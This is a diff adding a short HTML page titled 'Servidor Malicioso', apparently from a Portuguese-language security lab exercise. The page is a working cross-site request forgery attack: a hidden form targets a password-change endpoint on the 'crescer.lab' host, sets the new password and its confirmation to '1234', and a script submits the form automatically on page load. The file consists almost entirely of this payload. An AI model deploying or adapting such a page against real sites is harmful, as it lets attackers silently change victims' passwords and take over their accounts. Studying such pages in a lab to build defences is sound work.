@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <title>Servidor Malicioso</title>
+</head>
+
+<body>
+    <form enctype="multipart/form-data" action="http://www.crescer.lab/usuario/alterar-senha" method="post">
+        <input type="hidden" name="senha" value="1234" />
+        <input type="hidden" name="confirmacao" value="1234" />
+    </form>
+    <script>
+        document.forms[0].submit()
+    </script>
+</body>
+
+</html>
